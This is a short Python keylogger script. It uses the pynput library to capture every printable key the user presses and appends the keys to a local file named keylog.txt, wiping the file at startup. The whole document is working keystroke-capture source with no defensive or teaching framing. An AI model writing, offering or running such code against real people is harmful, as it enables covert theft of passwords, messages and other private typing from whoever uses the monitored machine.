import os
import sys
import logging
from pynput.keyboard import Listener

# Set the output file path
output_file = "keylog.txt"

def on_press(key):
    try:
        # Log the pressed key (excluding special keys)
        if key.char:
            with open(output_file, "a") as f:
                f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter, etc.)
        pass

def main():
    # Create the output file or clear its contents
    with open(output_file, "w") as f:
        f.write("")

    # Set up the keylogger
    logging.basicConfig(filename=output_file, level=logging.INFO)
    listener = Listener(on_press=on_press)
    listener.start()

    try:
        listener.join()
    except KeyboardInterrupt:
        listener.stop()

if __name__ == "__main__":
    main()
